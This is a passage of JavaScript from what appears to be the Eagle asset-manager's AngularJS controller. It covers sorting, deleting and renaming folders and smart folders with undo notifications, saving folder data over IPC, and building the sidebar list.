                }
                catch (err) {}
            });

            if (reverse) {
                folders = folders.reverse();
            }
        }

        $scope.reorderFolderByTitle = function(folders, reverse) {
            swal({
                html: `
                    <div class="alert">
                        <div class="alert-icon warning"></div>
                        <h4 class="alert-title">${i18n.__("dialog.reorderFolder.title")}</h4>
                    </div>
                `,
                showCloseButton: false, showCancelButton: true, allowOutsideClick: false, focusConfirm: true, focusCancel: false, padding: 24,
                width: 400,
                customClass: "alert-box",
                cancelButtonColor: "#777777",
                confirmButtonText: i18n.__('dialog.reorderFolder.sortBtn'),
                cancelButtonText: i18n.__("general.cancel"),
            }).then(function () {
                reorderFolderByTitle(folders, reverse);
                $scope.updateSidebarList();
                $scope.saveFolder();
                $scope.$evalAsync();
                try { electronLog && electronLog.info(`[app] Sort folders by folder name`); } catch (err) {};
            });
        };

        $scope.reorderAllFolderByTitle = function(reverse) {
            swal({
                html: `
                    <div class="alert">
                        <div class="alert-icon warning"></div>
                        <h4 class="alert-title">${i18n.__("dialog.reorderFolder.title")}</h4>
                    </div>
                `,
                showCloseButton: false, showCancelButton: true, allowOutsideClick: false, focusConfirm: true, focusCancel: false, padding: 24,
                width: 400,
                customClass: "alert-box",
                cancelButtonColor: "#777777",
                confirmButtonText: i18n.__('dialog.reorderFolder.sortBtn'),
                cancelButtonText: i18n.__("general.cancel"),
            }).then(function () {
                reorderFolderByTitle($scope.folders, reverse);
                eagle.utils.tree.walk($scope.folders, 'children', function(folder, parent) {
                    reorderFolderByTitle(folder.children, reverse);
                });
                $scope.updateSidebarList();
                $scope.saveFolder();
                $scope.$evalAsync();
                try { electronLog && electronLog.info(`[app] Sort all folders by folder name`); } catch (err) {};
            });
        };

        $scope.removeSmartFolder = function (smartFolder) {
            setTimeout(function () {
                var removeConfirmMsg = $filter('i18n')("dialog.removeSmartFolder.desc", [
                    { "property": "folder", "value": smartFolder.name },
                ]);
                swal({
                    html: `
                        <div class="alert">
                            <div class="alert-icon warning"></div>
                            <h4 class="alert-title">${i18n.__('dialog.removeSmartFolder.title')}</h4>
                            <p class="alert-desc">${removeConfirmMsg}</p>
                        </div>
                    `,
                    showCloseButton: false, showCancelButton: true, allowOutsideClick: false, focusConfirm: true, focusCancel: false, padding: 24,
                    width: 400,
                    customClass: "alert-box",
                    cancelButtonColor: "#777777",
                    confirmButtonText: i18n.__('dialog.removeSmartFolder.button'),
                    cancelButtonText: i18n.__("general.cancel"),
                }).then(function () {
                    removeSmartFolder(smartFolder, {});
                });
            }, 100);
        };

        var removeSmartFolder = function (smartFolder, { ignoreSelectNext, ignoreRestore }) {

            var message = $filter('i18n')("notify.folder.remove", [
                { "property": "folder", "value": smartFolder.name },
            ]);

            var children = $scope.smartFolders;
            if (smartFolder.parent && $scope.smartFolderMappings[smartFolder.parent]) {
            	let parent = $scope.smartFolderMappings[smartFolder.parent];
                children = parent.children;
            }
            var origin = angular.copy(children);
            var idx = children.indexOf(smartFolder);

            if (idx === -1) return;

            children.splice(idx, 1);
            delete $scope.smartFolderMappings[smartFolder.id];
            QuickAccessManager.remove("smartFolder", smartFolder);

            // 如果已經沒有資料夾
            if (idx === 0) {
                if (children[idx]) {
                    $scope.openSmartFolder(children[idx]);
                } else {
                    $scope.currentSmartFolder = undefined;
                    $scope.openAll();
                }
            }
            // 如果還有資料夾
            else {
                if (children[idx]) {
                    $scope.openSmartFolder(children[idx]);
                } else {
                    if (children[idx - 1]) {
                        $scope.openSmartFolder(children[idx - 1]);
                    } else {
                        $scope.currentSmartFolder = undefined;
                        $scope.openAll();
                    }
                }
            }

            // 如果声音效果是开启的
            if ($rootScope.preferences.notification.soundEffect.enable != 'false' && $rootScope.preferences.notification.soundEffect.when.deleteFolder == 'true') {
                $scope.removeSound.play();
            }
            $scope.updateSidebarList();

            $timeout(function() {
                $scope.saveFolderDebounce();
            }, 1000);

            electronLog && electronLog.info(`[app] Remove smart-folder: ${smartFolder.name}(${smartFolder.id})`);

            if (!ignoreRestore) {
                $rootScope.notify({
                    message: message,
                    duration: 5000,
                }, function() {
                	if (smartFolder.parent && $scope.smartFolderMappings[smartFolder.parent]) {
		            	let parent = $scope.smartFolderMappings[smartFolder.parent];
		                parent.children = origin;
		            }
		            else {
		            	$scope.smartFolders = origin;
		            }
                    $scope.smartFolderMappings[smartFolder.id] = smartFolder;
                    eagle.utils.tree.walk($scope.smartFolders, 'children', function (sf, parent, depth) {
                    	$scope.smartFolderMappings[sf.id] = sf;
                    });
                    $scope.updateSidebarList();
                    $scope.openSmartFolder(smartFolder);
                    $scope.saveFolderDebounce();
                    $scope.$evalAsync();
                });
            }
        };

        $scope.removeFolder = function(folder, params = {}) {

            if (folder.password && !folder.isUnLock) return;

            // 如果圖片或子文件夾超過數量，就需要顯示詢問視窗
            if (folder.images && folder.imageCount > 0 || folder && folder.children.length > 0) {
                setTimeout(function () {
                    var removeConfirmMsg = $filter('i18n')("dialog.removeFolder.desc", [
                        { "property": "folder", "value": folder.name },
                    ]);
                    swal({
                        html: `
                            <div class="alert">
                                <div class="alert-icon warning"></div>
                                <h4 class="alert-title">${$filter('i18n')('dialog.removeFolder.title')}</h4>
                                <p class="alert-desc">${removeConfirmMsg}</p>
                            </div>
                        `,
                        showCloseButton: false, showCancelButton: true, allowOutsideClick: false, focusConfirm: true, focusCancel: false, padding: 24,
                        width: 400,
                        customClass: "alert-box",
                        cancelButtonColor: "#777777",
                        input: 'checkbox',
                        inputValue: 1,
                        inputValidator: function (result) {
                            return new Promise(function (resolve, reject) {
                                resolve(result);
                            })
                        },
                        inputPlaceholder: $filter('i18n')('dialog.removeFolder.checkbox'),
                        confirmButtonText: $filter('i18n')('dialog.removeFolder.button'),
                        cancelButtonText: $filter('i18n')("general.cancel"),
                    }).then(function (result) {
                        $scope.checkOperationSafety2(folder.descendantImageCount, function () {
                            params.isDeleteImages = (result == 1);
                            removeFolder(folder, params);
                            $scope.$evalAsync();
                        }, 50);
                    }, function () {});
                }, 100);
            }
            else {
                removeFolder(folder, params);
            }
        };

        $scope.removeSelectedFolders = function () {

            if ($rootScope.selectedFolders.length === 0) return;

            var removeConfirmMsg = $filter('i18n')("dialog.removeFolder.descMultiple", [
                { "property": "count", "value": $rootScope.selectedFolders.length },
            ]);
            swal({
                html: `
                    <div class="alert">
                        <div class="alert-icon warning"></div>
                        <h4 class="alert-title">${$filter('i18n')('dialog.removeFolder.title')}</h4>
                        <p class="alert-desc">${removeConfirmMsg}</p>
                    </div>
                `,
                showCloseButton: false, showCancelButton: true, allowOutsideClick: false, focusConfirm: true, focusCancel: false, padding: 24,
                width: 400,
                customClass: "alert-box",
                cancelButtonColor: "#777777",
                input: 'checkbox',
                inputValue: 1,
                inputValidator: function (result) {
                    return new Promise(function (resolve, reject) {
                        resolve(result);
                    })
                },
                inputPlaceholder: $filter('i18n')('dialog.removeFolder.checkbox'),
                confirmButtonText: $filter('i18n')('dialog.removeFolder.button'),
                cancelButtonText: $filter('i18n')("general.cancel"),
            }).then(function (result) {
                $scope.checkOperationSafety2($rootScope.selectedFolders.length, function () {
                    var isDeleteImages = (result == 1);
                    $rootScope.selectedFolders.forEach(function (folder) {
                        if (folder.password && !folder.isUnLock) return;
                        removeFolder(folder, {isDeleteImages: isDeleteImages, ignoreRestore: true });
                    });
                }, 1);
            }, function () {});
        };

        $scope.removeSelectedSmartFolders = function () {

            if ($rootScope.selectedSmartFolders.length === 0) return;

            var removeConfirmMsg = $filter('i18n')("dialog.removeSmartFolder.descMultiple", [
                { "property": "count", "value": $rootScope.selectedSmartFolders.length },
            ]);
            swal({
                html: `
                    <div class="alert">
                        <div class="alert-icon warning"></div>
                        <h4 class="alert-title">${i18n.__('dialog.removeSmartFolder.title')}</h4>
                        <p class="alert-desc">${removeConfirmMsg}</p>
                    </div>
                `,
                showCloseButton: false, showCancelButton: true, allowOutsideClick: false, focusConfirm: true, focusCancel: false, padding: 24,
                width: 400,
                customClass: "alert-box",
                cancelButtonColor: "#777777",
                confirmButtonText: i18n.__('dialog.removeSmartFolder.button'),
                cancelButtonText: i18n.__("general.cancel"),
            }).then(function (result) {
                $rootScope.selectedSmartFolders.forEach(function (smartFolder) {
                    removeSmartFolder(smartFolder, {ignoreRestore: true});
                });
                $rootScope.selectedSmartFolders = [];
            }, function () {});
        };

        function removeFolder(folder, { isDeleteImages, ignoreSelectNext, ignoreRestore }) {

            // 支持復原文件夾
            var originalFolders = [];
            var originalImages = [];
            var originalImageFolders = [];
            var folderId = folder.id;
            if (!ignoreRestore) {
                cloneTree(originalFolders, $scope.folders, true);
            }

            // 找到包含 folder 的 list
            var parent = $scope.folderMappings[folder.parent];
            var children = (parent) ? parent.children : $scope.folders;
            if (!Array.isArray(children)) return;

            var index = children.indexOf(folder);
            if (index === -1) return;

            // 移除 folder
            children.splice(index, 1);

            // 删除包含 folder.id 的图片
            if ($scope.raw && $scope.raw.length > 0) {
                // console.time("删除包含 folder.id 的图片");
                var changed = [];
                for (var rindex = $scope.raw.length - 1; rindex >= 0; rindex--) {
                    var image = $scope.raw[rindex];
                    if (image.folders) {
	                    var idx = image.folders.indexOf(folder.id);
	                    if (idx > -1) {
	                        if (isDeleteImages) {
	                            // 如果圖片還存在於其它文件夾，就不丟到垃圾桶
	                            if (image.folders && image.folders.length === 1) {
	                                image.isDeleted = true;
	                            }
	                        }
	                        originalImageFolders.push(angular.copy(image.folders));
	                        image.folders.splice(idx, 1);
	                        changed.push(image);
	                        originalImages.push(image);
	                    }
	                }
                }
                ayncsImagesChange(changed);
                hiddenByCurrentFilter(changed);
                // console.timeEnd("删除包含 folder.id 的图片");
            }

            // 同时删除子文件夹图片
            if (folder.children) {
                eagle.utils.tree.walk(folder.children, 'children', function(child, parent) {
                    if ($scope.raw && $scope.raw.length > 0) {
                        // console.time("删除包含 folder.id 的图片");
                        var changed = [];
                        for (var rindex = $scope.raw.length - 1; rindex >= 0; rindex--) {
                            var image = $scope.raw[rindex];
                            if (image.folders) {
	                            var idx = image.folders.indexOf(child.id);
	                            if (idx > -1) {
	                                if (isDeleteImages) {
	                                    // 如果圖片還存在於其它文件夾，就不丟到垃圾桶
	                                    if (image.folders && image.folders.length === 1) {
	                                        image.isDeleted = true;
	                                    }
	                                }
	                                originalImageFolders.push(angular.copy(image.folders));
	                                image.folders.splice(idx, 1);
	                                changed.push(image);
	                                originalImages.push(image);
	                            }
	                        }
                        }
                        // console.timeEnd("删除包含 folder.id 的图片");
                        ayncsImagesChange(changed);
                        hiddenByCurrentFilter(changed);
                    }
                });
            }

            // 开启下一个文件夹
            // 优先开启兄弟，若兄弟皆亡，找老爸，老爸亡，找 All
            // 兄弟还有存在
            if (!ignoreSelectNext) {
                if (children.length > 0) {
                    var next = children[index] || children[index - 1] || children[0];
                    $scope.openFolder(next);
                } else if (parent) {
                    $scope.openFolder(parent);
                } else {
                    $scope.openAll();
                }
            }
            else {
                $scope.rebindRefresh();
            }

            // 播放删除音效
            if ($rootScope.preferences.notification.soundEffect.enable != 'false' && $rootScope.preferences.notification.soundEffect.when.deleteFolder == 'true') {
                $scope.removeSound.play();
            }

            QuickAccessManager.remove("folder", folder);
            if (folder.children && $scope.quickAccess.length > 0) {
                eagle.utils.tree.walk(folder.children, 'children', function(child, parent) {
                	QuickAccessManager.remove("folder", child);
                });
            }
            $scope.updateSidebarList();

            // 移除记录
            delete $scope.folderMappings[folder.id];
            $scope.calculateImageBinding({ ignoreSort: true }, function() {
                $scope.$evalAsync();
                $scope.saveFolderDebounce();
                if (isDeleteImages) { electronLog && electronLog.info(`[app] Delete folder: ${folder.name}(${folder.id}), contains ${originalImages.length} files, all remain ${$scope.all.length} files, trash remain: ${$scope.trash.length} files`); }
                else { electronLog && electronLog.info(`[app] Delete folder: ${folder.name}(${folder.id}), just remove folder not contains ${originalImages.length} files, all remain ${$scope.all.length} files, trash remain: ${$scope.trash.length} files`); }
            });

            if (!ignoreRestore) {
                var message = $filter('i18n')("notify.folder.remove", [
                    { "property": "folder", "value": folder.name },
                ]);
                $rootScope.notify({
                    message: message,
                    duration: 7000,
                }, function() {
                    $scope.folders = originalFolders;

                    eagle.utils.tree.walk($scope.folders, 'children', function(folder, parent) {
                        if (!folder.children) { folder.children = []; }
                        if (folder && parent) { folder.parent = parent.id; }
                        $scope.folderMappings[folder.id] = folder;
                    });

                    for (var i = originalImages.length - 1; i >= 0; i--) {
                        var img = originalImages[i];
                        if (!img) continue;
                        img.folders = originalImageFolders[i];
                        img.folders = [...new Set(img.folders)];
                        delete img.isDeleted;
                    }

                    $scope.calculateImageBinding({ ignoreSort: true }, function() {
                        $scope.openFolder($scope.folderMappings[folder.id]);
                        electronLog && electronLog.info(`[app] Resotre deleted folder: ${folder.name}(${folder.id}), contains ${originalImages.length} files, all remain ${$scope.all.length} files, trash remain ${$scope.trash.length} files`);
                    });

                    $scope.$evalAsync();
                    $scope.updateSidebarList();
                    $scope.saveFolderDebounce();
                    ayncsImagesChange(originalImages);
                });
            }
        };

        $scope.onRenameKeydown = _.throttle(function(event, folder) {
            // console.log(event.target.value);
            var keyCode = event.keyCode;
            if (keyCode === 13 || keyCode === 9) {
                event.preventDefault();
                if (folder.newFolderName === '') {
                    folder.editable = false;
                    folder.newFolderName = folder.name;
                }
                else if (folder.newFolderName != folder.name) {
                    if ($scope.currentFolder) {
                        $scope.changeFolderName(folder, folder.newFolderName);
                    } else if ($scope.currentSmartFolder) {
                        $scope.changeSmartFolderName(folder, folder.newFolderName);
                    }
                    folder.editable = false;
                }
                else {
                    folder.editable = false;
                }
            }
            else if (keyCode === 27) {
                event.preventDefault();
                folder.editable = false;
                folder.newFolderName = folder.name;
            }
        }, 50, true);

        // 批次创建多个文件夹
        $scope.onPasteFolderName = function ($event, node) {

            if (node.name !== i18n.__('general.untitled.folder')) return;

            let text = clipboard.readText();
            let names = text.split(/[\n]+/);
            let parent = node.parent;
            let folderList = $scope.folders;
            let iconColor = node.iconColor;
            let icon = node.icon;
            let parentFolder = $scope.folderMappings[node.parent];
            
            if (parentFolder) {
                folderList = parentFolder.children;
            }

            let idx = folderList.indexOf(node);

            names = names.filter((name) => {
                return !!name;
            });

            if (names.length > 1) {
                event.preventDefault();
                node.editable = false;
                node.name = names.shift().substr(0, 1024).trim();
                node.newFolderName = node.name;
                names = names.reverse();
                names.forEach(function (name, index) {
                    if (name === "") return; 
                    let folder = {
                        id: guid(),
                        name: name.substr(0, 1024).trim(),
                        images: [],
                        folders: [],
                        iconColor: iconColor,
                        icon: icon,
                        modificationTime: Date.now(),
                        editable: false,
                        imagesMappings: {},
                        tags: [],
                        children: [],
                        isExpand: false,
                    };
                    if (parentFolder) {
                        folder.parent = parentFolder.id;
                    }
                    folderList.splice(idx + 1, 0, folder);
                    $scope.folderMappings[folder.id] = folder;
                });
                $scope.updateSidebarList();
                $scope.saveFolder();
            }
        };

        $scope.changeFolderName = _.throttle(function changeFolderName (folder, name) {

            if (!name) return;
            name = name.substr(0, 1024);

            if (!folder || !name || folder.name == name) {
                folder.editable = false;
                return;
            }
            var originFolder = angular.copy(folder);
            folder.editable = false;
            folder.name = name;

            if ($scope.currentFocus && $scope.currentFolder === folder) {
                $scope.currentFolderPath = $scope.getFolderFullPath(folder);
            }

            if (typeof folder.name === "string") {
                folder.pinyin = tinyPinyin.convertToPinyin(folder.name);
            }
            $scope.saveFolder();
            $scope.updateSelection();

            if (originFolder.name != "Untitle") {

                var message = $filter('i18n')("notify.folder.nameChange", [
                    { "property": "origin", "value": originFolder.name },
                    { "property": "new", "value": folder.name }
                ]);

                $rootScope.notify({
                    message: message,
                    duration: 4000,
                }, function() {
                    folder.name = originFolder.name;
                    if (typeof folder.name === "string") {
                        folder.pinyin = tinyPinyin.convertToPinyin(folder.name);
                    }
                    $scope.saveFolder();
                });

                try { 
                    electronLog && electronLog.info(`[app] Change folder name: ${originFolder.name}(${folder.id}) > ${name}`); 
                    analytics.event('Folder', 'Rename', name);
                } catch (err) {};
            }
        }, 50);

        $scope.changeSmartFolderName = function(smartFolder, name) {

            if (!name) return;
            name = name.substr(0, 1024);

            if (!smartFolder || !name || smartFolder.name == name) return;
            var originSmartFolder = angular.copy(smartFolder);
            smartFolder.name = name;
            smartFolder.pinyin = tinyPinyin.convertToPinyin(smartFolder.name);
            $scope.saveFolder();
            if (originSmartFolder.name != "Untitle") {

                var message = $filter('i18n')("notify.folder.nameChange", [
                    { "property": "origin", "value": originSmartFolder.name },
                    { "property": "new", "value": smartFolder.name }
                ]);

                $rootScope.notify({
                    message: message,
                    duration: 4000,
                }, function() {
                    smartFolder.name = originSmartFolder.name;
                    smartFolder.pinyin = tinyPinyin.convertToPinyin(smartFolder.name);
                    $scope.saveFolder();
                });

                try { 
                    electronLog && electronLog.info(`[app] Change smart-folder name: ${originSmartFolder.name}(${smartFolder.id}) > ${name}`); 
                    analytics.event('SmartFolder', 'Rename', name);
                } catch (err) {};
            }
        };

        $scope.$on("CALCULATE_IMAGE_BINDING", function(e, params) {
            $scope.calculateImageBinding(params);
        });

        $scope.$on("REBIND_REFRESH", function(e, mute) {
            $timeout(function() {
                $scope.rebindRefresh(mute);
            }, 500);
        });

        $scope.$on("UPDATE_SELECTION", function(e) {
            $scope.updateSelection();
        });

        $scope.$on("SAVE_FOLDER", function(e) {
            $scope.saveFolder();
        });

        $scope.saveFolderDebounceTimeout = null;
        $scope.saveFolderDebounce = () => {
            $scope.isLibrarySaving = true;
            clearTimeout($scope.saveFolderDebounceTimeout);
            $scope.saveFolderDebounceTimeout = setTimeout(() => {
                $scope.saveFolder();
                $scope.isLibrarySaving = false;    
            }, 1000);
        };

        $scope.saveFolder = function() {
            console.time("$scope.saveFolder");

            // 保存時進行日文濁音正規化
            const unrom = require(appRoot.path + '/app/js/utils/unorm.js');
            const nfc = (text) => {
                try {
                    return unrom.nfc(text);
                }
                catch (err) {
                    return text;
                }
            };

            var folders = [];
            cloneTree(folders, $scope.folders);

            eagle.utils.tree.walk(folders, 'children', function (folder, parent, depth) {
                folder.name = nfc(folder.name);
            });
            
            const smartFolders = $scope.smartFolders.map(function(smartFolder) {
                var clone = {
                    id: smartFolder.id,
                    icon: smartFolder.icon,
                    iconColor: smartFolder.iconColor,
                    name: smartFolder.name,
                    description: smartFolder.description || "",
                    modificationTime: smartFolder.modificationTime,
                    conditions: smartFolder.conditions,
                };
                if (smartFolder.children) {
                	clone.children = smartFolder.children;
                }
                if (smartFolder.orderBy) {
                    clone.orderBy = smartFolder.orderBy;
                    clone.sortIncrease = smartFolder.sortIncrease;
                }
                return clone;
            });

            eagle.utils.tree.walk(smartFolders, 'children', function (smartFolder, parent, depth) {
                smartFolder.name = nfc(smartFolder.name);
            });

            const groups = TagManager.groups.map(function (group) {
                var g = {
                    id: group.id,
                    name: nfc(group.name),
                    tags: group.tags
                };
                if (group.color) {
                    g.color = group.color;
                }
                return g;
            });

            const quickAccess = $scope.quickAccess.map(function (item) {
                return {
                    type: item.type,
                    id: item.id
                }
            });

            const libraryPath = $scope.libraryPath;

            IPCHelper.send('folders-change', {
                // NOTE: 把資源庫路徑寫死，避免更新到其他資源庫路徑
                libraryDir: libraryPath,
                folders: folders,
                smartFolders: smartFolders,
                quickAccess: quickAccess,
                tagsGroups: groups,
            });

            console.timeEnd("$scope.saveFolder");
        };

        $scope.toggleQuickAccessVisible = function () {
            $scope.isExpandQuickAccess = !$scope.isExpandQuickAccess;
            localStorage.setItem("eagle.sidebar.quickAccess.expand", $scope.isExpandQuickAccess);
            $scope.updateSidebarList();
        };

        $scope.toggleSmartFolderVisible = function () {
            $scope.isExpandSmartFolder = !$scope.isExpandSmartFolder;
            localStorage.setItem("eagle.sidebar.smartFolder.expand", $scope.isExpandSmartFolder);
            $scope.updateSidebarList();
        };

        $scope.toggleFolderVisible = function () {
            $scope.isExpandFolder = !$scope.isExpandFolder;
            localStorage.setItem("eagle.sidebar.folder.expand", $scope.isExpandFolder);
            $scope.updateSidebarList();
        };

        function getAllChildFolder (fd) {
            let folders = [];
            eagle.utils.tree.walk(fd.children, 'children', function (folder, parent, depth) {
                folders.push(folder);
            });
            folders = [...new Set(folders)];
            return folders;
        }

        // 取得文件夹祖先们
        function getAncestorFolders (folder, folders) {
            try {
                if (folder.parent && $scope.folderMappings[folder.parent]) {
                    var parent = $scope.folderMappings[folder.parent];
                    if (parent.id != folder.id) {
                        folders.push(parent);
                        return getAncestorFolders(parent, folders);
                    }
                }
                folders = [...new Set(folders)];
                return folders;
            }
            catch (err) {
                electronLog && electronLog.error(err.stack || err);
                folders = [...new Set(folders)];
                return folders;
            }
        }

        function getAncestorSmartFolders (folder, folders) {
            try {
                if (folder.parent && $scope.smartFolderMappings[folder.parent]) {
                    var parent = $scope.smartFolderMappings[folder.parent];
                    if (parent.id != folder.id) {
                        folders.push(parent);
                        return getAncestorSmartFolders(parent, folders);
                    }
                }
                return folders;
            }
            catch (err) {
                electronLog && electronLog.error(err.stack || err);
                return folders;
            }
        }

        var updateSidebarListTimeout;
        $scope.updateSidebarList = function () {
            $timeout.cancel(updateSidebarListTimeout);
            updateSidebarListTimeout = $timeout(function () {
                // console.time("$scope.updateSidebarList");
                var list = [];
                var allItem = { vstype: 'all', size: 27 };
                var unfiledItem = { vstype: 'unfiled', size: 27 };
                var untaggedItem = { vstype: 'untagged', size: 27 };
                var randomItem = { vstype: 'random', size: 27 };
                var recentItem = { vstype: 'recent', size: 27 };
                var communityItem = { vstype: 'community', size: 27 };
                var allTagsItem = { vstype: 'allTags', size: 27 };
                var trashItem = { vstype: 'trash', size: 27 };
                var folders = $scope.getFolderList();
                var smartFolders = $scope.getSmartFolderList();
                var quickAccess = $scope.getQuickAccessList();
                var quickAccessLabel = { vstype: 'label-qucik-access', size: 25 };
                var smartFolderLabel = { vstype: 'label-smart-folder', size: 25 };
                var folderLabel = { vstype: 'label-folder', size: 25 };

                folders = filterSidebarItem(folders, $scope.folderKeyword);
                smartFolders = filterSidebarItem(smartFolders, $scope.folderKeyword);

                list.push(allItem);
                if ($rootScope.preferences.sidebar.unfiled != 'false') {
                    list.push(unfiledItem);
                }
                if ($rootScope.preferences.sidebar.untagged != 'false') {
                    list.push(untaggedItem);
                }
                if ($rootScope.preferences.sidebar.recent != 'false') {
                    list.push(recentItem);
                }
                if ($rootScope.preferences.sidebar.random != 'false') {
                    list.push(randomItem);
                }
                if ($rootScope.preferences.sidebar.community2 != 'false') {
                    list.push(communityItem);
                }
                list.push(allTagsItem);
                list.push(trashItem);

                if ($scope.quickAccess.length > 0 && $rootScope.preferences.sidebar.quickAccess != 'false') {
                    list.push({ vstype: 'separator', size: 14 });
                    list.push(quickAccessLabel);
                    if ($scope.isExpandQuickAccess && $scope.quickAccess.length > 0) {
                        list = list.concat(quickAccess); 
                        list.push({ vstype: 'separator', size: 14 });
                    }
                }
                else {
                    list.push({ vstype: 'separator', size: 14 });
                }

                if ($rootScope.preferences.sidebar.smartFolder != 'false') {
                    if (!$scope.folderKeyword) {
                        list.push(smartFolderLabel);
                    }
                    else if (smartFolders.length > 0) {
                        list.push(smartFolderLabel);
                    }
                    if (smartFolders.length > 0) {
                        if ($scope.isExpandSmartFolder) {
                            list = list.concat(smartFolders);
                            list.push({ vstype: 'separator', size: 14 });
                        }
                    }
                }

                if ($rootScope.preferences.sidebar.folder != 'false') {
                    if (!$scope.folderKeyword) {
                        list.push(folderLabel);
                    }
                    else if (folders.length > 0) {
                        list.push(folderLabel);
                    }
                    if ($scope.isExpandFolder) {
                        list = list.concat(folders);
                    }
                }
                
                list.forEach(function (node, index) {
                    node.index = index;
                });

                $scope.sidebarList = list;
            }, 20);
        };

        $scope.getQuickAccessList = function () {
            var list = [];
            $scope.quickAccess.forEach(function (item) {
                item.size = 27;
                item.vstype = 'quickAccess';
                list.push(item);
            });
            return list;
        };

        $scope.getSmartFolderList = function () {

            let list = [];
            let isFiltering = !!$scope.folderKeyword;
            let guidelinesMap = {};

            $scope.smartFolderList = [];

            eagle.utils.tree.walk($scope.smartFolders, 'children', function (smartFolder, parent, depth) {

                // 計算 guidelines 顏色及數量
                let guidelines = [];
                if (parent && guidelinesMap[parent.id]) {
                    const parentGuidelines = guidelinesMap[parent.id];
                    guidelines = [...parentGuidelines, smartFolder.iconColor || 'normal'];
                }
                else {
                    guidelines = [smartFolder.iconColor || 'normal'];
                }
                guidelinesMap[smartFolder.id] = guidelines;

            	var idx;
            	var isVisible = false;

            	if (parent) {
            		smartFolder.parent = parent.id;;
            	}
            	else {
            		delete smartFolder.parent;
            	}

            	// 列表版本 SmartFolders
                $scope.smartFolderList.push(smartFolder);

            	$scope.smartFolderMappings[smartFolder.id] = smartFolder;

                smartFolder.depth = depth;
                smartFolder.size = 27;
            	smartFolder.vstype = 'smartFolder';
                smartFolder.guidelines = guidelines.slice(0, guidelines.length - 1);
                smartFolder.styles = {
                    depth: depth,
                    first: false,
                    last: false
                };

                if (parent) {
                    smartFolder.isVisible = smartFolder.isExpand && parent.isVisible;
                }
                else {
                    smartFolder.isVisible = smartFolder.isExpand;
                }

				if (depth !== 0 && parent && parent.children) {
					idx = parent.children.indexOf(smartFolder);
					if (idx === 0 && parent.children.length > 1) {
						smartFolder.styles.first = true;
						smartFolder.styles.last = false;
					}
					else if (idx === 0 && parent.children.length === 1) {
						smartFolder.styles.first = false;
						smartFolder.styles.last = true;
					}
					else if (idx === parent.children.length - 1) {
						smartFolder.styles.first = false;
						smartFolder.styles.last = true;
					}
					else {
						smartFolder.styles.first = false;
						smartFolder.styles.last = false;
					}
				}
				if (smartFolder && smartFolder.isExpand && smartFolder.children && smartFolder.children.length > 0) {
					smartFolder.styles.last = true;
				}

                // 决定是否要在画面上显示
                if (!parent) {
                    list.push(smartFolder);
                }
                else if (isFiltering) {
                    list.push(smartFolder);
                }
                else {
                    if (smartFolder && parent.isVisible) {
                        list.push(smartFolder);
                    }
                }
                
            });

            return list;
        };

        $scope.getFolderList = function () {
            let list = [];
            let isFiltering = !!$scope.folderKeyword;
            let guidelinesMap = {};
            
            eagle.utils.tree.walk($scope.folders, 'children', function (folder, parent, depth) {

                // 計算 guidelines 顏色及數量
                let guidelines = [];
                if (parent && guidelinesMap[parent.id]) {
                    const parentGuidelines = guidelinesMap[parent.id];
                    guidelines = [...parentGuidelines, folder.iconColor || 'normal'];
                }
                else {
                    guidelines = [folder.iconColor || 'normal'];
                }
                guidelinesMap[folder.id] = guidelines;

                var idx;
                folder.size = 27;
                folder.vstype = 'folder';
                folder.guidelines = guidelines.slice(0, guidelines.length - 1);
                folder.styles = {
                    depth: depth,
                    first: false,
                    last: false
                };

                if (parent) {
                    if (parent.password) {
                        folder.isVisible = folder.isExpand && parent.isVisible && !!parent.isUnLock;
                    }
                    else {
                        folder.isVisible = folder.isExpand && parent.isVisible;
                    }
                }
                else {
                    folder.isVisible = folder.isExpand;
                }

				if (depth !== 0 && parent && parent.children) {
					idx = parent.children.indexOf(folder);
					if (idx === 0 && parent.children.length > 1) {
						folder.styles.first = true;
						folder.styles.last = false;
					}
					else if (idx === 0 && parent.children.length === 1) {
						folder.styles.first = false;
						folder.styles.last = true;
					}
					else if (idx === parent.children.length - 1) {
						folder.styles.first = false;
						folder.styles.last = true;
					}
					else {
						folder.styles.first = false;
						folder.styles.last = false;
					}
				}
				if (folder && folder.isExpand && folder.children.length > 0) {
					folder.styles.last = true;
				}

                // 决定是否要在画面上显示
                if (!parent) {
                    list.push(folder);
                }
                else if (isFiltering) {
                    list.push(folder);
                }
                else {
                    if (parent.password) {
                        if (folder && parent.isVisible && !!parent.isUnLock) {
                            list.push(folder);
                        }
                    }
                    else {
                        if (folder && parent.isVisible) {
                            list.push(folder);
                        }
                    }
                }
            });
            return list;
        };

        $scope.refreshRandom = function () {
            if ($scope.isDetailMode) return;

            if (
                $scope.viewMode === 'random' || 
                ($scope.currentFolder && $scope.currentFolder.orderBy === "RANDOM") ||
                ($scope.currentSmartFolder && $scope.currentSmartFolder.orderBy === "RANDOM")
            ) {
                $scope.shuffle = [];
                $("#refresh-random").addClass("active");
                setTimeout(function () {
                    $("#refresh-random").removeClass("active");
                }, 50);
                $scope.reload();
            }
        };

        $scope.getFolderImages = function (folder, includeSubFolder) {
            var images = [];
            for (var rindex = $scope.raw.length - 1; rindex >= 0; rindex--) {
                try {
                    var image = $scope.raw[rindex];
                    if (image.isDeleted) continue;
                    var isContain = image.folders.indexOf(folder.id) > -1;
                    if (includeSubFolder) {
                        if (!isContain) {
                            eagle.utils.tree.walk(folder.children, 'children', function(child, parent) {
                                if (image.folders.indexOf(child.id) > -1) {
                                    isContain = true;
                                    return;
                                }
                            });
                        }
                    }
                    if (isContain) {
                        images.push(image);
                    }
                }
                catch (err) {}
            }
            return images;
        };

        $scope.reload = _.debounce(function reload (keepDetailMode) {

            $scope.hexColor = undefined;
            $scope.unlockPassword = "";
            
            if (!keepDetailMode) {
                if ($scope.isDetailMode) {
                    $scope.leaveDetailMode();
                }

                if ($scope.selected.length > 0) {
                    $scope.selected = [];
                }
            }

            $scope.loadMoreDisable = false;
            $scope.lastImageHeight = $scope.imageSize.height;
            $scope.boxContianerWidth = $("#box-container").width() || $scope.boxContianerWidth;
            $scope.rebindRefresh();
            $scope.relayout();
            $scope.updateSelection();
            $scope.calculateFilterCounts();
            $scope.updateSubFolderWidth();
            $("#box-container-scrollbar").trigger("UPDATE_BOX_SCROLLBAR");

            autoResizeTagFilter();
            if ($scope.layout === "GridLayout" || $scope.layout === "SquareLayout") { 
                $scope.adjustLayoutWidth(0); 
            }
            $scope.listDone = true;

            if ($("#box-container").scrollTop() !== 0) {
                $("#box-container").scrollTop(0);
            }
            $(".box.processed").removeClass("processed");
            setTimeout(function () {
                $("#image-drop-area").show();
                $("#box-container").trigger("scroll");
            }, 100);
            setTimeout(function () {
